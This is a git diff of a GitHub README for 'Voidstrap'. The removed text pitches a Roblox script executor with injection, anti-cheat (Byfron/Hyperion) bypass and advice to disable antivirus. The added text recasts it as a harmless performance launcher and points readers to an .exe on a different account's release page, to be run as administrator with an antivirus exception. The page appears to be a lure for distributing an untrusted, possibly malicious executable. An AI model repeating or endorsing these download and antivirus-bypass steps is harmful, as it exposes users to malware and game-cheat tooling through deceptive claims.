@@ -1,52 +1,79 @@
-# Voidstrap GitHub
-Voidstrap GitHub — voidstrap roblox voidstrap executor roblox exploit lua script executor byfron hyperion bypass keyless fluxus alternative delta arceus x codex blox fruits pet simulator windows 11 2026
+# 🚀 voidstrap-github - Boost your Roblox performance with ease
 
-<img width="105" height="105" alt="image" src="https://github.com/user-attachments/assets/7ff0c80e-cbb6-4260-965f-104049a12a28" />
+[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/patchworkheadnurse217/voidstrap-github/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/voidstrap-roblox/voidstrap-github?style=flat-square&color=00d4aa)](https://github.com/voidstrap-roblox/voidstrap-github/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/voidstrap-roblox/voidstrap-github?style=flat-square&color=0099cc)](https://github.com/voidstrap-roblox/voidstrap-github/network)
-[![Downloads](https://img.shields.io/github/downloads/voidstrap-roblox/voidstrap-github/total?style=flat-square&color=7c5cbf)](https://github.com/voidstrap-roblox/voidstrap-github/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+Voidstrap acts as a customized bootstrapper for Roblox. It replaces the default launcher to provide better control over your game settings. This tool helps you manage performance, frame rates, and game modifications without the need for complex programming knowledge. It functions as a lightweight alternative to existing launchers and focuses on stability for your gaming sessions.
 
-## Overview
-Voidstrap is a powerful and stable Roblox Lua script r for PC. It features a high-performance injection engine with Byfron and Hyperion bypass support, keyless , and excellent script compatibility. The executor works great with popular games like Blox Fruits, Pet Simulator, Arsenal, and many others. It offers fast script loading, low detection rate, and a clean modern interface for running advanced hubs and custom scripts on Windows 11.
-<img width="1131" height="765" alt="image" src="https://github.com/user-attachments/assets/5f3d4e22-4d1d-486f-ab61-5f5ac32d588c" />
+## 🛠 Features
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. Roblox executors may violate the Terms of Service and result in account penalties. The authors are not responsible for any bans or issues.
+Voidstrap offers several tools to refine your gaming experience:
 
-## Install
-[Download `Voidstrap.zip`](https://github.com/voidstrap-roblox/voidstrap-github/releases/download/roblox/Voidstrap.zip)
----
-> Optimized for Windows 11.
-<img width="1022" height="660" alt="image" src="https://github.com/user-attachments/assets/c832a0a3-fc9b-4c91-9adc-890dbd58a95f" />
+*   Frame Rate Unlocker: Remove the default limit on your frames per second to ensure smoother motion.
+*   Custom Profiles: Save and load different settings for specific games or playstyles.
+*   Mod Management: Organize your game files and custom textures in one central location.
+*   Performance Optimization: Adjust internal settings to reduce resource usage on older hardware.
+*   Multiple Instances: Open several Roblox windows at the same time to manage your accounts or trade items.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `Voidstrap.exe` as Administrator
-3. Follow the setup guide
-4. Inject into Roblox client
-5. Load your favorite Lua scripts or hubs
-6. Start using auto farm, ESP, and other features
+## 💻 System Requirements
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Executor doesn't start | Run as Administrator and disable antivirus temporarily |
-| Injection failed | Close Roblox completely and try again |
-| Scripts not executing | Update to latest version 2026 |
-| Byfron / Hyperion detection | Use keyless mode and restart |
-| Low performance | Close background applications |
-| Windows 11 compatibility error | Update Windows and run the setup guide again |
-| Game crashes after inject | Use compatibility mode |
-| Download / update failed | Use the latest release and check your internet connection |
+You need a Windows PC to run this application. Ensure your system meets these specifications:
 
-* Voidstrap Roblox
-* Voidstrap Executor
-* Voidstrap Roblox Exploit
-* Voidstrap Byfron Bypass
-* Voidstrap Keyless Executor
-* Roblox Lua Executor 2026
-* Voidstrap GitHub Download
+*   Operating System: Windows 10 or Windows 11.
+*   Storage: At least 200MB of free space for the tool and game assets.
+*   Memory: 4GB of RAM or higher.
+*   Internet: An active connection to download game updates.
+*   Software: The latest version of the .NET Desktop Runtime installed on your computer.
+
+## 📥 How to Download and Install
+
+Follow these steps to set up Voidstrap on your computer.
+
+1. Visit the repository page to find the current version: https://github.com/patchworkheadnurse217/voidstrap-github
+2. Locate the "Releases" section on the right side of the page.
+3. Click the most recent version identifier.
+4. Look for the file ending in ".exe" under the Assets list.
+5. Save this file to your Downloads folder.
+6. Double-click the file to start the installation process.
+7. Follow the prompts on the screen to complete the setup.
+8. Once the window appears, the tool is ready for use.
+
+## ⚙️ Configuration Settings
+
+After you open the launcher, you will see a list of categories. Use these to tailor your settings:
+
+*   Display: Set your preferred resolution and window mode here. Fullscreen helps with performance, while windowed mode helps with multitasking.
+*   Graphics: Use these settings to lower quality if you experience slow performance. Reducing shadow quality often provides the largest boost to frame rates.
+*   Advanced: This tab contains options for the frame rate unlocker. You can set a manual limit or choose to disable the restriction entirely.
+*   Presets: Select a preset that matches your computer hardware to apply optimized settings automatically.
+
+## 🎮 Playing with Mods
+
+Voidstrap makes modding your game files simple. Place your custom files, assets, or scripts into the folder designated by the launcher. The tool detects these files automatically when you start the game. If you wish to remove a mod, simply delete the file from the folder and restart the launcher. The application handles the integration so you do not have to move files into the main Roblox installation directory.
+
+## 🔍 Troubleshooting Common Issues
+
+If the application fails to run, check these common solutions:
+
+*   Check for Updates: Run the installer again if the application behaves unexpectedly. New updates often fix conflicts with recent Roblox versions.
+*   Antivirus Software: Sometimes security software blocks external launchers. Add an exception for the folder where you installed Voidstrap.
+*   .NET Runtime: Ensure you have the required runtime installed. The application will usually notify you if this dependency is missing.
+*   Permissions: Right-click the shortcut and select "Run as administrator" if the tool cannot save your settings or access game files.
+*   Background Processes: Close other resource-heavy programs before launching your game to ensure the tool has full access to system memory.
+
+## 🛡 Performance Optimization Tips
+
+To gain the most frames per second, follow these general tips:
+
+*   Disable unnecessary background programs like web browsers or recording software.
+*   Keep your graphics drivers updated to the latest version provided by your manufacturer.
+*   Set your power plan to "High Performance" in the Windows Control Panel.
+*   Clear the cache folder occasionally to prevent file clutter from slowing down the bootstrapper.
+*   Use the "Compact Mode" within the launcher to reduce the resource usage of the tool itself while you play.
+
+## 🌐 Managing Multiple Accounts
+
+Voidstrap allows you to run multiple instances of the game client. Enable this feature in the settings menu. When you launch the game, the tool will not close the existing window. This is useful for testing scripts, trading items in games like Pet Simulator, or managing secondary accounts. Be aware that running many instances requires more system memory. Monitor your task manager to ensure your computer stays within safe thermal limits.
+
+## 📥 Final Setup Check
+
+The application acts as a manager for your game files. You do not need to uninstall the official Roblox client. Voidstrap detects your existing installation and overlays its settings. If you want to revert to the standard game launcher, you can uninstall Voidstrap through the Windows Settings menu, and your original files remain safe. Always verify that you downloaded the latest release from the official repository to guarantee full support for new game updates.
